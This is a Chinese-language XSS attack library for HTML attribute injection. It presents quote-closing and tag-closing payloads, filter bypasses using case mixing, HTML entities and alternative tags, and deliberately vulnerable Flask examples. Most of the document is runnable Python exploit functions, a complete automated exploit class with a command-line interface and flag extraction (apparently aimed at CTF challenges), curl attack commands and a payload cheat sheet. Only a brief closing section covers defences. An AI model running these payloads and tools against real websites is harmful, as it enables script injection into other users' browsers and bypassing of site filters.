# XSS-HTML标签属性注入-攻击库

## 概述

**攻击类型**：跨站脚本攻击 - HTML标签属性上下文注入  
**影响范围**：所有Web应用  
**风险等级**：High  
**攻击目标**：当用户输入被插入到HTML标签属性中时，通过闭合属性、注入事件处理器执行XSS

**核心原理**：
当用户输入直接嵌入到HTML标签的属性值中（如`value="USER_INPUT"`）时，攻击者可以通过闭合引号、注入新属性（事件处理器）或闭合标签来执行XSS攻击。

**典型漏洞场景**：
```html
<input type="text" value="USER_INPUT">
```

**攻击Payload**：
```html
" onfocus=alert('XSS') autofocus x="
```

**执行结果**：
```html
<input type="text" value="" onfocus=alert('XSS') autofocus x="">
```

---

## 核心攻击技术

### 技术1：基本属性值闭合注入

**原理**：
用户输入被插入到HTML属性值中，通过闭合引号并注入事件处理器。

**漏洞代码示例**：
```python
# Flask示例
@app.route('/page')
def xss():
    msg = request.args.get('name', '')
    value = 'value="{0}"'.format(msg)
    return f'<input type="text" {value}>'
```

**攻击Payload**：
```html
<!-- 双引号闭合 -->
" onfocus=alert('XSS') autofocus x="

<!-- 单引号闭合 -->
' onfocus=alert('XSS') autofocus x='

<!-- 不使用引号（某些情况） -->
 onfocus=alert('XSS') autofocus 
```

**完整注入示例**：
```html
<!-- 原始代码 -->
<input type="text" value="USER_INPUT">

<!-- Payload: " onfocus=alert('XSS') autofocus x=" -->
<input type="text" value="" onfocus=alert('XSS') autofocus x="">

<!-- 结果：自动获得焦点并执行alert -->
```

**利用代码**：
```python
import requests

def exploit_input_value_injection(target_url, param_name='name'):
    """HTML input value属性XSS"""
    
    payloads = [
        '" onfocus=alert("XSS") autofocus x="',
        '\' onfocus=alert("XSS") autofocus x=\'',
        '" onmouseover=alert("XSS") x="',
        '" onclick=alert("XSS") x="',
        '" oninput=alert("XSS") x="',
    ]
    
    for payload in payloads:
        try:
            params = {param_name: payload}
            r = requests.get(target_url, params=params)
            
            # 检查payload是否成功注入
            if 'onfocus' in r.text or 'oninput' in r.text:
                print(f"[+] 成功注入: {payload}")
                return payload
                
        except Exception as e:
            continue
    
    return None
```

---

### 技术2：自动触发事件

**原理**：
使用特殊HTML属性使事件自动触发，无需用户交互。

**自动触发技术1 - autofocus**：
```html
<!-- 页面加载时自动聚焦并触发onfocus -->
" onfocus=alert('XSS') autofocus x="
```

**自动触发技术2 - onerror**：
```html
<!-- 闭合标签并注入img，加载错误自动触发 -->
"><img src=x onerror=alert('XSS')>
```

**自动触发技术3 - onload**：
```html
<!-- 使用body/svg等标签的onload -->
"><svg/onload=alert('XSS')>
```

**自动触发技术4 - onanimationstart**：
```html
<!-- CSS动画开始时触发 -->
" style="animation:x" onanimationstart=alert('XSS') x="
```

**完整自动触发代码**：
```python
def exploit_auto_trigger_xss(target_url, param_name):
    """自动触发XSS攻击"""
    
    auto_trigger_payloads = [
        # autofocus触发
        '" onfocus=alert("XSS") autofocus x="',
        
        # onerror触发
        '"><img src=x onerror=alert("XSS")>',
        
        # onload触发
        '"><svg/onload=alert("XSS")>',
        '"><body onload=alert("XSS")>',
        
        # onanimationstart触发
        '" style="animation:x" onanimationstart=alert("XSS") x="',
        
        # onpageshow触发
        '"><body onpageshow=alert("XSS")>',
    ]
    
    for payload in auto_trigger_payloads:
        params = {param_name: payload}
        r = requests.get(target_url, params=params)
        
        if any(keyword in r.text for keyword in ['onfocus', 'onerror', 'onload', 'onanimationstart']):
            print(f"[+] 自动触发XSS成功: {payload[:50]}...")
            return payload
    
    return None
```

---

### 技术3：闭合标签注入新标签

**原理**：
不仅闭合属性，还闭合整个标签，然后注入新的HTML元素。

**完整标签闭合Payload**：
```html
<!-- 闭合input标签 -->
"><script>alert('XSS')</script>

<!-- 使用img标签 -->
"><img src=x onerror=alert('XSS')>

<!-- 使用svg标签 -->
"><svg/onload=alert('XSS')>

<!-- 使用iframe标签 -->
"><iframe onload=alert('XSS')>
```

**利用代码**：
```python
def exploit_tag_closing_injection(target_url, param_name):
    """闭合标签注入新元素"""
    
    tag_close_payloads = [
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        '"><svg/onload=alert("XSS")>',
        '"><iframe onload=alert("XSS")>',
        '"><body onload=alert("XSS")>',
        '"><input onfocus=alert("XSS") autofocus>',
    ]
    
    for payload in tag_close_payloads:
        params = {param_name: payload}
        r = requests.get(target_url, params=params)
        
        if 'onerror' in r.text or 'onload' in r.text or '<script>' in r.text:
            print(f"[+] 标签闭合注入成功: {payload[:30]}...")
            return payload
    
    return None
```

---

### 技术4：绕过关键字过滤

**原理**：
当`script`等关键字被过滤时，使用其他方法执行XSS。

**绕过技术1 - 使用其他标签**：
```html
<!-- 不用script，用img -->
"><img src=x onerror=alert('XSS')>

<!-- 使用svg -->
"><svg/onload=alert('XSS')>

<!-- 使用iframe -->
"><iframe onload=alert('XSS')>
```

**绕过技术2 - 大小写混淆**：
```html
<!-- script被过滤，用SCRIPT -->
"><SCRIPT>alert('XSS')</SCRIPT>

<!-- 混合大小写 -->
"><ScRiPt>alert('XSS')</ScRiPt>
```

**绕过技术3 - 编码绕过**：
```html
<!-- HTML实体编码 -->
"><img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;XSS&#x27;&#x29;>

<!-- Unicode编码 -->
"><img src=x onerror=\u0061\u006c\u0065\u0072\u0074('XSS')>
```

**绕过技术4 - 使用事件处理器代替script**：
```html
<!-- 各种事件处理器 -->
" onfocus=alert('XSS') autofocus x="
" onmouseover=alert('XSS') x="
" onclick=alert('XSS') x="
" oninput=alert('XSS') x="
" onchange=alert('XSS') x="
```

**完整绕过代码**：
```python
def bypass_keyword_filter(target_url, param_name):
    """绕过关键字过滤"""
    
    bypass_payloads = [
        # 使用其他标签
        '"><img src=x onerror=alert("XSS")>',
        '"><svg/onload=alert("XSS")>',
        
        # 大小写混淆
        '"><SCRIPT>alert("XSS")</SCRIPT>',
        '"><ScRiPt>alert("XSS")</ScRiPt>',
        
        # 编码绕过
        '"><img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;XSS&#39;&#41;>',
        
        # 事件处理器
        '" onfocus=alert("XSS") autofocus x="',
        '" onmouseover=alert("XSS") x="',
    ]
    
    for payload in bypass_payloads:
        params = {param_name: payload}
        r = requests.get(target_url, params=params)
        
        # 检查是否成功绕过
        if any(keyword in r.text.lower() for keyword in ['onerror', 'onload', 'onfocus', 'script']):
            print(f"[+] 关键字过滤绕过成功: {payload[:40]}...")
            return payload
    
    return None
```

---

### 技术5：POST请求属性注入

**原理**：
某些应用使用POST方法提交数据，攻击方式类似但需要POST请求。

**漏洞代码示例**：
```python
@app.route('/page', methods=['POST', 'GET'])
def xss():
    msg = request.form.get('solution', '')
    value = 'value="{0}"'.format(msg)
    return f'<input type="text" {value}>'
```

**攻击Payload（POST）**：
```bash
# POST请求
curl -X POST http://target/page \
  -d "solution=\" onfocus=alert('XSS') autofocus x=\""
```

**利用代码**：
```python
def exploit_post_attribute_injection(target_url, param_name='solution'):
    """POST请求属性注入"""
    
    payloads = [
        '" onfocus=alert("XSS") autofocus x="',
        '" onclick=alert("XSS") x="',
        '"><img src=x onerror=alert("XSS")>',
    ]
    
    for payload in payloads:
        try:
            data = {param_name: payload}
            r = requests.post(target_url, data=data)
            
            if 'onfocus' in r.text or 'onerror' in r.text:
                print(f"[+] POST注入成功: {payload}")
                return payload
                
        except Exception as e:
            continue
    
    return None
```

---

### 技术6：多属性上下文注入

**原理**：
用户输入可能出现在多个属性或多个位置，需要针对性构造payload。

**多位置注入场景**：
```html
<!-- 场景1：同时在value和title属性 -->
<input type="text" value="USER_INPUT" title="USER_INPUT">

<!-- 场景2：在多个input中 -->
<input name="field1" value="USER_INPUT">
<input name="field2" value="USER_INPUT">
```

**通用Payload**：
```html
<!-- 适用于多个位置的通用payload -->
" onfocus=alert(1) autofocus x="

<!-- 闭合任意标签的通用payload -->
"><script>alert(1)</script>
```

---

### 技术7：无引号属性注入

**原理**：
某些HTML属性值没有引号包围，可以直接注入空格分隔的新属性。

**无引号场景**：
```html
<!-- 没有引号的属性值 -->
<input type=text value=USER_INPUT>
```

**攻击Payload**：
```html
<!-- 直接注入新属性（用空格分隔） -->
test onfocus=alert('XSS') autofocus

<!-- 结果 -->
<input type=text value=test onfocus=alert('XSS') autofocus>
```

**利用代码**：
```python
def exploit_no_quote_injection(target_url, param_name):
    """无引号属性注入"""
    
    # 不需要闭合引号
    payloads = [
        'test onfocus=alert("XSS") autofocus',
        'x onmouseover=alert("XSS")',
        'x onclick=alert("XSS")',
    ]
    
    for payload in payloads:
        params = {param_name: payload}
        r = requests.get(target_url, params=params)
        
        if 'onfocus' in r.text or 'onmouseover' in r.text:
            print(f"[+] 无引号注入成功: {payload}")
            return payload
    
    return None
```

---

## 完整自动化利用工具

```python
#!/usr/bin/env python3
"""
HTML标签属性XSS完整利用工具
"""
import requests
import sys
import re

class HTMLAttributeXSSExploit:
    def __init__(self, target_url, param_name='name', method='GET'):
        self.target_url = target_url
        self.param_name = param_name
        self.method = method.upper()
        self.session = requests.Session()
    
    def test_basic_injection(self):
        """测试基本属性注入"""
        print("[*] 测试基本HTML属性注入...")
        
        payloads = [
            '" onfocus=alert("XSS") autofocus x="',
            '\' onfocus=alert("XSS") autofocus x=\'',
            '" onclick=alert("XSS") x="',
            '" oninput=alert("XSS") x="',
        ]
        
        for payload in payloads:
            try:
                if self.method == 'GET':
                    params = {self.param_name: payload}
                    r = self.session.get(self.target_url, params=params)
                else:
                    data = {self.param_name: payload}
                    r = self.session.post(self.target_url, data=data)
                
                if self.check_success(r.text):
                    print(f"[+] 基本注入成功!")
                    print(f"[+] Payload: {payload}")
                    return r.text
                    
            except Exception as e:
                continue
        
        return None
    
    def test_tag_closing(self):
        """测试标签闭合注入"""
        print("[*] 测试标签闭合注入...")
        
        payloads = [
            '"><script>alert("XSS")</script>',
            '"><img src=x onerror=alert("XSS")>',
            '"><svg/onload=alert("XSS")>',
            '"><iframe onload=alert("XSS")>',
        ]
        
        for payload in payloads:
            if self.method == 'GET':
                params = {self.param_name: payload}
                r = self.session.get(self.target_url, params=params)
            else:
                data = {self.param_name: payload}
                r = self.session.post(self.target_url, data=data)
            
            if self.check_success(r.text):
                print(f"[+] 标签闭合注入成功!")
                print(f"[+] Payload: {payload}")
                return r.text
        
        return None
    
    def bypass_filters(self):
        """绕过过滤"""
        print("[*] 尝试绕过过滤...")
        
        bypass_payloads = [
            # 大写绕过
            '"><SCRIPT>alert("XSS")</SCRIPT>',
            
            # 其他标签
            '"><img src=x onerror=alert("XSS")>',
            '"><svg/onload=alert("XSS")>',
            
            # 编码绕过
            '"><img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;XSS&#39;&#41;>',
            
            # 事件处理器
            '" onmouseover=alert("XSS") x="',
        ]
        
        for payload in bypass_payloads:
            if self.method == 'GET':
                params = {self.param_name: payload}
                r = self.session.get(self.target_url, params=params)
            else:
                data = {self.param_name: payload}
                r = self.session.post(self.target_url, data=data)
            
            if self.check_success(r.text):
                print(f"[+] 过滤绕过成功!")
                print(f"[+] Payload: {payload}")
                return r.text
        
        return None
    
    def check_success(self, response_text):
        """检查XSS是否成功"""
        success_indicators = [
            'congratulations',
            'flag{',
            'correct',
            'success',
        ]
        
        response_lower = response_text.lower()
        
        for indicator in success_indicators:
            if indicator in response_lower:
                return True
        
        # 也检查是否成功注入了事件处理器
        if any(keyword in response_text for keyword in ['onfocus=', 'onerror=', 'onload=', 'onclick=']):
            return True
        
        return False
    
    def extract_flag(self, response_text):
        """提取FLAG"""
        flag_match = re.search(r'flag\{[^}]+\}', response_text, re.I)
        
        if flag_match:
            return flag_match.group()
        
        return None
    
    def full_exploit(self):
        """完整利用流程"""
        print("="*60)
        print("HTML标签属性XSS利用工具")
        print("="*60 + "\n")
        
        print(f"[*] 目标: {self.target_url}")
        print(f"[*] 参数: {self.param_name}")
        print(f"[*] 方法: {self.method}\n")
        
        # 1. 测试基本注入
        result = self.test_basic_injection()
        
        if result:
            flag = self.extract_flag(result)
            if flag:
                print(f"\n[+] FLAG: {flag}")
                return flag
            return result
        
        # 2. 测试标签闭合
        result = self.test_tag_closing()
        
        if result:
            flag = self.extract_flag(result)
            if flag:
                print(f"\n[+] FLAG: {flag}")
                return flag
            return result
        
        # 3. 绕过过滤
        result = self.bypass_filters()
        
        if result:
            flag = self.extract_flag(result)
            if flag:
                print(f"\n[+] FLAG: {flag}")
                return flag
            return result
        
        print("\n[-] 所有方法均未成功")
        return None

# 命令行使用
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <目标URL> [参数名] [方法]")
        print(f"例如: {sys.argv[0]} http://target/page name GET")
        print(f"      {sys.argv[0]} http://target/page solution POST")
        sys.exit(1)
    
    target = sys.argv[1]
    param = sys.argv[2] if len(sys.argv) > 2 else 'name'
    method = sys.argv[3] if len(sys.argv) > 3 else 'GET'
    
    exploit = HTMLAttributeXSSExploit(target, param, method)
    result = exploit.full_exploit()
    
    if result:
        print("\n[+] 攻击成功!")
    else:
        print("\n[-] 攻击失败")
```

---

## 实战场景

### 场景1：input value属性注入

**应用背景**：
Flask应用，用户输入直接插入到input的value属性。

**漏洞代码**：
```python
@app.route('/page', methods=['POST'])
def xss9():
    msg = request.form.get('solution','')
    value = 'value="{0}"'.format(msg)
    return f'<input type="text" {value}>'
```

**利用步骤**：
```bash
curl -X POST http://target/page \
  -d 'solution=" onfocus=alert("XSS") autofocus x="'
```

---

### 场景2：闭合标签注入新元素

**应用背景**：
用户输入在标签属性中，但过滤了部分内容。

**利用Payload**：
```bash
# GET请求
curl "http://target/page?name=\"><img src=x onerror=alert('XSS')>"
```

---

### 场景3：绕过script过滤

**应用背景**：
应用过滤了`<script>`标签但允许其他标签。

**利用代码**：
```python
import requests

# 使用img标签绕过script过滤
r = requests.get('http://target/page', params={
    'name': '"><img src=x onerror=alert("XSS")>'
})

if 'congratulations' in r.text.lower():
    print("[+] 成功绕过script过滤!")
```

---

## 手动测试命令

```bash
# 1. GET请求基本注入
curl "http://target/page?name=\" onfocus=alert('XSS') autofocus x=\""

# 2. POST请求注入
curl -X POST http://target/page \
  -d 'solution=" onclick=alert("XSS") x="'

# 3. 标签闭合注入
curl "http://target/page?name=\"><script>alert('XSS')</script>"

# 4. img标签注入
curl "http://target/page?name=\"><img src=x onerror=alert('XSS')>"

# 5. svg标签注入
curl "http://target/page?name=\"><svg/onload=alert('XSS')>"
```

---

## Payload速查表

| 场景 | Payload | 说明 |
|------|---------|------|
| value属性双引号 | `" onfocus=alert('XSS') autofocus x="` | 自动触发 |
| value属性单引号 | `' onfocus=alert('XSS') autofocus x='` | 自动触发 |
| 标签闭合+script | `"><script>alert('XSS')</script>` | 闭合标签 |
| 标签闭合+img | `"><img src=x onerror=alert('XSS')>` | 错误触发 |
| 标签闭合+svg | `"><svg/onload=alert('XSS')>` | 加载触发 |
| POST value注入 | `" onclick=alert('XSS') x="` | 点击触发 |

---

## 防御措施

### 1. HTML实体编码

```python
import html

# 不要这样
value = f'value="{user_input}"'

# 应该这样
value = f'value="{html.escape(user_input)}"'
```

### 2. 使用模板引擎自动转义

```python
# Flask Jinja2自动转义
return render_template('page.html', user_input=user_input)

# 模板中
<input type="text" value="{{ user_input }}">
```

### 3. Content Security Policy

```python
# 设置CSP头
response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
```

### 4. 输入验证

```python
import re

def validate_input(user_input):
    # 只允许字母数字
    if not re.match(r'^[a-zA-Z0-9]+$', user_input):
        raise ValueError("Invalid input")
    return user_input
```

---

## 总结

**HTML标签属性XSS攻击要点**：
1. ✅ 闭合HTML属性引号（双引号或单引号）
2. ✅ 注入事件处理器（onfocus、onerror、onclick等）
3. ✅ 使用autofocus等属性自动触发事件
4. ✅ 闭合整个标签注入新HTML元素
5. ✅ 绕过关键字过滤（使用其他标签/编码）
6. ✅ 防御关键：HTML实体编码 + 模板引擎自动转义

HTML标签属性是最常见的XSS注入点，危害严重且利用简单。
